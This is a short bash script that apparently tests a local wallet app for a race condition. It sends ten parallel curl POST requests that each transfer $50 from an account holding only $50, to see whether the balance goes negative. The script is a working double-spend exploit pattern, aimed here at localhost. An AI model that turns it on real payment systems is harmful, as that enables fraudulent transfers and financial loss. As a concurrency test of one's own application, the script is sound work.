#!/bin/bash

# Target: Your Local Bank
URL="http://localhost:3000/wallet/transfer"

# The Plan: Move $50 ten times (Total $500), but we only have $50.
# If the bank is secure, 1 should succeed and 9 should fail.
# If the bank is VULNERABLE, all 10 might succeed (creating negative balance).

echo "Starting Attack on $URL..."

# Fire 10 requests in parallel
for i in {1..10}
do
   curl -s -X POST $URL \
   -H "Content-Type: application/json" \
   -d '{"fromId": 101, "toId": 102, "amount": 50}' &
done

# Wait for all background jobs to finish
wait
echo "Attack Complete."
